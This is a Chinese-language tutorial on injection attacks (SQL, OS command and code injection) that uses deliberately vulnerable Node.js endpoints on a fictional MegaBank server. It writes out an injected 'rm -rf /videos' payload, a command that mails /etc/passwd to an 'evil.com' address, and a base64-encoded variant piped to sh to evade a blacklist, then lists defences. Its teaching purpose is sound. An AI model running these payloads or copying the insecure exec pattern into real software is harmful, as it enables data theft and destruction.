# 注入攻击

现代应用程序的一个关键方面是能够与输入交互，并根据用户输入执行操作。这些输入通常由应用程序的服务器端处理，它们可以影响数据库查询、控制应用程序逻辑或决定要显示的内容。换句话说，这涉及应用程序不同层（前端、后端、数据库）之间的复杂交互。然而，这个过程带来了重大的安全风险，如果用户输入未经过适当的验证和清理，可能会使应用程序暴露于广泛的漏洞中。

根据处理输入所涉及的层，可能会出现各种漏洞。例如，如果后端层中用户提供的输入被用于执行与系统命令交互的函数而未经过适当验证，则可能导致远程命令执行。同样，在数据库层，未经处理的输入可能导致 SQL 注入漏洞。在前端，不充分的验证可能使应用程序面临客户端注入攻击。因此，这些问题可以广义地归类为输入验证漏洞。

针对 Web 应用的最广为人知的攻击类型之一是 SQL 注入。SQL 注入是一种专门针对 SQL 数据库的注入攻击，它允许恶意用户要么向现有 SQL 查询提供自己的参数，要么逃逸 SQL 查询并提供自己的查询。自然，由于默认赋予 SQL 解释器较高的权限，这通常会导致数据库被入侵。

SQL 注入是最常见的注入形式，但并非唯一形式。**注入攻击**有两个主要组成部分：一个**解释器**和一个来自用户的**载荷**，该载荷以某种方式被读入解释器。这意味着注入攻击可能发生在命令行工具（如视频压缩工具 FFMPEG）以及数据库（如传统的 SQL 注入情况）上。

基于解释器的类型对注入攻击进行分类：

- XXE - XML 解释器
- SQLi - SQL 解释器
- 编程语言代码注入 - JavaScript/Python/PHP 编程语言解释器
- 操作系统命令注入 - Shell 解释器
- 模板注入

让我们看几种注入攻击形式，以便更好地理解此类攻击需要什么样的应用架构，以及如何构造和传递针对易受攻击 API 的载荷。

## 数据库

几乎所有应用程序都依赖数据存储区来管理在应用程序中处理的数据。在许多情况下，这些数据负责处理核心应用程序逻辑、保存用户账户、权限、应用程序配置设置等。现在，数据存储区已不再只是被动的数据容器。大多数数据存储区都保存有结构化、可以使用预先定义的查询格式或语言访问的数据，并包含内部逻辑来管理这些数据。

通常，应用程序使用常用的权限级别来管理对数据存储区的各种访问操作，以及处理属于不同应用程序用户的数据。如果攻击者能够破坏应用程序与数据存储区的交互，使应用程序检索或修改各种数据，那么，攻击者就可以避开在应用层次对数据访问实施的任何控制。

上述原则适用于任何类型的数据存储技术。每一种新型注入攻击都需要结合概念加以理解。掌握利用这些缺陷的基础知识后，如果再遇到一种新型注入攻击，你就能够自信地应用这些知识，设计出其他攻击方法，向其他人已经研究过的漏洞发动攻击。

## 注入解释型语言

解释型语言（interpreted language）是一种在运行时由一个运行时组件（runtime component）解释语言代码并执行其中包含的指令的语言。与之相对，编译型语言（compiled language）是这样一种语言：它的代码在生成时转换成机器指令，然后在运行时直接由使用该语言的计算机处理器执行这些指令。

从理论上说，任何语言都可使用编译器或解释器来执行，这种区别并不是语言本身的内在特性。但是，通常大多数语言仅通过上述其中一种方式执行，开发Web应用程序使用的许多核心语言使用解释器执行，包括SQL、Javascript、Perl和PHP。

基于解释型语言的执行方式，产生了一系列注入漏洞。任何有实际用途的应用程序都会收到用户提交的数据，对其进行处理并执行相应的操作。因此，由解释器处理的数据实际上是由程序员编写的*代码*和用户提交的*数据*共同组成的。有些时候，攻击者可以提交专门设计的输入，通常提交某个在应用程序中使用解释型语言语法的具有特殊意义的句法，向应用程序实施攻击。结果，这个输入的一部分被解释成程序指令执行

另一方面，在编译型语言中实施旨在执行任意命令的攻击往往非常困难。这时，注入代码的方法通常并不利用开发目标程序所使用语言的任何语法特性，注入的有效载荷为机器代码，而不是用那种语言编写的指令。

**避开登录**

无论访问操作是由普通用户还是应用程序管理员触发，应用程序访问数据存储区的过程都大致相同。Web应用程序对数据存储区实施自主访问控制，构造查询基于用户的账户和类型来检索、添加或修改数据存储区中的数据。修改查询（不只是查询中的数据）的成功注入攻击可以避开应用程序的自主访问控制并获取未授权访问。

如果需要安全保护的应用程序逻辑由查询结果控制，攻击者就可以通过修改查询来更改应用程序的逻辑。举一个典型的例子——在后端数据存储区的用户表中查询与用户提供的证书匹配的记录。许多实施基于表单的登录功能的应用程序使用数据库来存储用户证书，并执行简单的SQL查询来确认每次登录尝试。

如果在数据库查询中收到一名用户的资料，登录尝试将取得成功，应用程序将为该用户建立一个通过验证的会话。

在这种情况下，攻击者可注入用户名或密码字段，以修改应用程序执行的查询，从而破坏它的逻辑。

假如攻击者不知道管理员的用户名，该如何实施攻击呢？在大多数应用程序中，数据库的第一个账户为管理用户，因为这个账户通常手工创建，然后再通过它生成其他应用程序账户。而且，如果查询返回几名用户的资料，许多应用程序只会处理第一名用户

注入解释型语言来更改应用程序逻辑是一种常用的攻击技巧。LDAP查询、XPath查询、消息序列实施或任何定制的查询语言中都可能出现对应的漏洞。

### 渗透测试步骤

解释型语言注入是一个非常宽泛的主题，涵盖许多不同种类的漏洞，并可能影响Web应用程序支持基础架构中的每一个组件。检测并利用注入缺陷的详细步骤取决于攻击所针对的是何种语言，以及应用程序开发者使用了什么编程技巧。但也有一些适用于各种情形的常规方法，如下所示。

1. 提交可能在解释型语言中引发问题的无效语法。

2. 确定应用程序响应中可能表示存在注入漏洞的任何反常现象。

3. 如果收到任何错误消息，分析这些消息，获得与服务器上发生的问题有关的证据。

4. 如有必要，系统性地修改初始输入，尝试确定或否定最初假设的漏洞诊断。

5. 构造一个概念验证测试（proof-of-concept test），使安全命令以可证实的方式执行，得出结论以证明应用程序中存在一个可被利用的注入漏洞。

6. 利用目标语言和组件的功能实现攻击目标，对漏洞加以利用。

## 注入示例

让我们考虑 MegaBank 为其面向客户的营销活动分配的一个图像/视频压缩服务器。该服务器是位于 `https://media.mega-bank.com` 的一组 REST API。特别是，它包含几个有趣的 API：

- `uploadImage`（POST）
- `uploadVideo`（POST）
- `getImage`（GET）
- `getVideo`（GET）

端点 `uploadImage()` 是一个简单的 Node.js 端点，看起来像这样：

```javascript
const imagemin = require('imagemin');
const imageminJpegtran = require('imagemin-jpegtran');
const fs = require('fs');

/*
 * 尝试将用户提供的图像上传到服务器。
 *
 * 使用 imagemin 进行图像压缩，以减少对服务器硬盘空间的影响。
 */
app.post('/uploadImage', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  /*
   * 将原始图像写入磁盘。
   */
  fs.writeFileSync(`/images/raw/${req.body.name}.png`, req.body.image);

  /*
   * 压缩原始图像，生成优化后的图像，占用更少磁盘空间。
   */
  const compressImage = async function() {
    const res = await imagemin([`/images/raw/${req.body.name}.png`],
                               `/images/compressed/${req.body.name}.jpg`);
    return res;
  };

  /*
   * 压缩请求者提供的图像，压缩完成后继续脚本执行。
   */
  const res = await compressImage();

  /*
   * 向客户端返回压缩图像的链接。
   */
  return res.status(200)
            .json({url: `https://media.mega-bank.com/images/${req.body.name}.jpg` });
});
```

这是一个非常简单的端点，将 PNG 图像转换为 JPG。它使用 imagemin 库来实现，并且除了文件名外，不接受用户的任何参数来确定压缩类型。

然而，一个用户可能利用文件名重复，导致 imagemin 库覆盖现有图像。这就是大多数操作系统上文件名的特性：

```html
<!-- 在 https://www.mega-bank.com 首页上 -->
<html>
  <!-- 其他标签 -->
  <img src="https://media.mega-bank.com/images/main_logo.png">
  <!-- 其他标签 -->
</html>
```

```javascript
const name = 'main_logo.png';
// 使用 req.body.name = main_logo.png 调用 uploadImage POST
```

这看起来不像注入攻击，因为它只是一个转换和保存图像的 JavaScript 库。事实上，它看起来只是一个编写不佳的 API 端点，没有考虑名称冲突的边缘情况。然而，由于 imagemin 库调用了一个 CLI（`imagemin-cli`），这实际上会是一个注入攻击——利用附加到 API 的未适当清理的 CLI 执行非预期操作。

不过这是一个非常简单的例子，除了当前情况外，没有太多可利用性。让我们看一个 SQL 领域之外的更详细的编程语言代码注入示例：

```javascript
const exec = require('child_process').exec;
const converter = require('converter');
const defaultOptions = '-s 1280x720';

/*
 * 尝试上传 HTTP POST 发起者提供的视频。
 *
 * 降低视频分辨率以获得更好的流媒体兼容性；
 * 这是通过一个名为 `converter` 的库完成的。
 */
app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  // 从 HTTP 请求体收集数据
  const videoData = req.body.video;
  const videoName = req.body.name;
  const options = defaultOptions + req.body.options;

  exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
});
```

假设这个虚构的转换器库在其自身上下文中运行 CLI，类似于许多 Unix 工具。换句话说，在运行命令 `convert` 后，执行器的作用域现在限定为转换器提供的命令，而非主机 OS 提供的命令。

在我们的案例中，用户可以轻松提供有效输入——也许压缩类型和音频比特率。这些可能如下：

```javascript
const options = '-c h264 -ab 192k';
```

另一方面，他们可能能够根据 CLI 的结构调用附加命令：

```javascript
const options = '-c h264 -ab 192k \\ convert -dir /videos -s 1x1';
```

如何向 CLI 注入附加命令取决于 CLI 的架构。有些 CLI 支持在一行上使用多个命令，而另一些则不支持。许多 CLI 会被换行符、空格或与符号（`&&`）分割。

在本例中，我们使用换行符向转换器 CLI 添加了附加语句。这不是开发者的预期用例，因为附加语句允许我们重定向转换器 CLI 并对不属于我们的视频进行修改。

如果此 CLI 直接针对主机 OS 运行，而非在自身隔离环境中运行，那么我们就会拥有命令注入而非编程语言代码注入。想象以下情况：

```bash
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720'
```

此命令在 Bash 中通过 Unix OS 终端运行，正如大多数压缩软件的运行方式。

考虑以下引号被逃逸的情况，允许命令直接针对主机 OS 运行，而非通过 `convert` 工具传递：

```javascript
const options = "' && rm -rf /videos";
```

由于使用了撇号（`'`）来打破 `options` 字符串，我们现在遇到了更危险的注入形式，导致以下命令针对主机 OS 运行：

```bash
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos
```

在脚本和系统级命令之间插值时，必须注意在针对主机 OS（Linux、Macintosh、Windows 等）或解释器（SQL、CLI 等）执行之前，字符串是如何被清理的，以防止操作系统命令注入和编程语言代码注入。

## 注入技术

SQL 注入攻击的概念适用于任何形式的注入攻击。带内、带外和推断/盲数据泄露技术适用于所有形式的注入，尽管最常用于 SQL 注入。

## 绕过常见防御

现代安全的 Web 应用通常会使用非常强大和有效的 SQL 注入缓解措施，如预编译语句和存储过程。然而，许多非 SQL CLI 工具尚未内置这些高级防御。因此，开发者诉诸于效果较差的缓解形式——大多数都可以被绕过。

防御注入攻击最常见的形式之一是黑名单。尽管黑名单很流行，但实际上很容易被绕过。原因有几个，但主要是因为规范会变化，且输入可以被掩盖，使得黑名单过滤代码无法检测到输入。

注入攻击依赖于两个主要因素：载荷和执行该载荷的解释器。黑名单只排除某些关键字、短语或字符串，防止它们被传递到解释器中执行。但通常可以用解释器仍能理解的不同方式描述相同的逻辑。

考虑一个情况，CLI 具有黑名单逻辑，阻止以下载荷执行：

```bash
mail -s "leaked file" "email@evil.com" < /etc/passwd
```

此注入攻击依赖 Linux 终端，并使用其 `mail` 命令将敏感文件发送到攻击者的 Web 服务器。但如果 `mail` 命令被应用级黑名单阻止，如何重新设计载荷使其包含相同逻辑但不会被黑名单过滤系统检测到？

事实证明，基于 Linux 的操作系统终端接受并执行多种编码，包括 base64。由于黑名单过滤系统评估纯文本以尝试阻止 `mail` 命令，将载荷转换为 base64 可能使其在未被检测的情况下溜过过滤代码。

首先，以 base64 编码原始载荷（这可以在 Chrome 开发者控制台中轻松完成）：

```javascript
const b64 = btoa('mail -s "leaked file" "email@evil.com" < /etc/passwd');
console.log(b64);
// bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA==
```

接下来，将 base64 载荷输入到被服务端过滤阻止的原始注入攻击中：

```bash
base64 -d <<< bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA== | sh
```

由于服务端过滤黑名单只支持纯文本评估，载荷不会被阻止。在它通过 API 黑名单并进入 Linux 终端时，内置的 base64 解码工具会在将其管道传输到 Bash 并执行之前将字符串转换回纯文本。这是一个典型的例子，说明为什么黑名单与白名单相比是一种非常差的安全机制。


## 防御措施

为了防止注入，应避免将用户输入插入到会被评估的代码中。此外，由于用户输入可以通过应用程序解析的文件传递到被评估的代码中，应该将用户上传的文件视为不受信任的，并保护程序执行、解析或包含的现有系统文件的完整性。

为了防止文件包含漏洞，应避免基于用户输入包含文件。如果这不可能，禁止包含远程文件，并为你的程序可以包含的本地文件创建白名单。你还可以将文件上传限制为某些安全的文件类型，并将上传的文件托管在与应用程序源代码不同的环境中。

还要避免直接调用系统命令，而是使用编程语言的系统API。大多数编程语言都有内置函数，允许你运行系统命令而无需冒命令注入的风险。例如，PHP有一个名为`mkdir(DIRECTORY_NAME)`的函数，而不是调用`system("mkdir DIRECTORY_NAME")`。

应对传递给危险函数（如`eval()`或`include()`）的输入实施强输入验证。但这项技术不能作为唯一的保护形式，因为攻击者不断提出创造性的方法来绕过输入验证。

保持补丁更新将防止应用程序的依赖项引入RCE漏洞。应用程序的依赖项（如开源包和组件）经常将漏洞引入应用程序。这也被称为**软件供应链攻击**。

部署Web应用防火墙（WAF）来阻止可疑攻击。

**最小权限原则**规定应用程序和进程应仅被授予完成其任务所需的权限。这是一种最佳实践，可降低攻击期间系统受损的风险，因为即使攻击者入侵了低权限用户或进程，也无法获得对敏感文件和操作的访问权限。例如，当Web应用程序仅需要读取文件时，不应授予任何写入或执行权限。这是因为，如果攻击者劫持了一个以高权限运行的应用程序，攻击者就可以获得其权限。

## 额外进阶

- **SQL 注入实验室**：尝试使用 `sqli-labs`，这是一个提供 12 种不同场景的仓库，涵盖了广泛的 SQL 注入技术。[https://github.com/Audi-1/sqli-labs]

- **堆叠查询**：研究堆叠查询并了解如何利用它们来利用 SQL 注入漏洞。探索它们在 MSSQL 中调用存储过程（如 `XP_CMDSHELL`）以实现 RCE 的用途。

- **双查询**：尝试基于双查询的注入，并发现它在数据外泄中的用途，尤其是在缺少基于 UNION 的技术的情况下。

- **SSTI 检测和利用工具**：自动检测和利用模板注入攻击。
  - [TINJA](https://github.com/Hackmanit/TInjA)
  - [TPLMAP](https://github.com/epinna/tplmap)

- **模板注入表**：查看“Template Injection Table”，这是一个交互式表格，包含高效的模板注入 polyglot 以及来自 44 个主要模板引擎的预期响应。[https://github.com/Hackmanit/template-injection-table]

- **NoSQL 注入**：研究在 Elasticsearch、Amazon DynamoDB、Couchbase 等数据库中利用 NoSQL 注入漏洞的技术。
